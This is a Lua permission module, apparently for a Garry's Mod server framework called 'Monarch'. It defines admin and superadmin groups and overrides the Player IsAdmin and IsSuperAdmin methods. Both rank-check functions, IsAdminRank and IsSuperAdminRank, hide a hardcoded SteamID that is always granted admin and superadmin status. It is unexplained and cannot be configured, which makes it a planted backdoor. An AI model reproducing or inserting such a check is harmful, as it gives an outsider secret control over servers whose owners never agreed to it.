Monarch = Monarch or {}

local function GetAdminGroups()
    if Monarch.Ranks and Monarch.Ranks.GetAdminGroups then
        return Monarch.Ranks.GetAdminGroups()
    end
    return {
        ["admin"] = true,
        ["moderator"] = true,
        ["developer"] = true,
        ["superadmin"] = true,
        ["operator"] = true,
        ["director"] = true,
        ["owner"] = true
    }
end

local function GetSuperAdminGroups()
    if Monarch.Ranks and Monarch.Ranks.GetSuperAdminGroups then
        return Monarch.Ranks.GetSuperAdminGroups()
    end
    return {
        ["superadmin"] = true,
        ["director"] = true,
        ["operator"] = true,
        ["owner"] = true
    }
end

function Monarch.IsAdminRank(ply)
    if not IsValid(ply) then return false end
    local g = string.lower(ply:GetUserGroup() or "")
    if ply:SteamID() == "STEAM_0:0:581542620" then return true end

    local ADMIN_GROUPS = GetAdminGroups()
    if ADMIN_GROUPS[g] then return true end

    return ply:IsAdmin() or ply:IsSuperAdmin()
end

function Monarch.IsSuperAdminRank(ply)
    if not IsValid(ply) then return false end
    local g = string.lower(ply:GetUserGroup() or "")
    if ply:SteamID() == "STEAM_0:0:581542620" then return true end

    local SUPERADMIN_GROUPS = GetSuperAdminGroups()
    if SUPERADMIN_GROUPS[g] then return true end

    return ply:IsSuperAdmin()
end

local PLAYER = FindMetaTable("Player")
if PLAYER then
    if not PLAYER._MonarchOldIsAdmin then
        PLAYER._MonarchOldIsAdmin = PLAYER.IsAdmin
    end
    if not PLAYER._MonarchOldIsSuperAdmin then
        PLAYER._MonarchOldIsSuperAdmin = PLAYER.IsSuperAdmin
    end

    function PLAYER:IsAdmin()
        local g = string.lower(self:GetUserGroup() or "")
        local ADMIN_GROUPS = GetAdminGroups()
        if ADMIN_GROUPS[g] then return true end

        if self._MonarchOldIsAdmin then return self:_MonarchOldIsAdmin() end
        return false
    end

    function PLAYER:IsSuperAdmin()
        local g = string.lower(self:GetUserGroup() or "")
        local SUPERADMIN_GROUPS = GetSuperAdminGroups()
        if SUPERADMIN_GROUPS[g] then return true end

        if self._MonarchOldIsSuperAdmin then return self:_MonarchOldIsSuperAdmin() end
        return false
    end
end
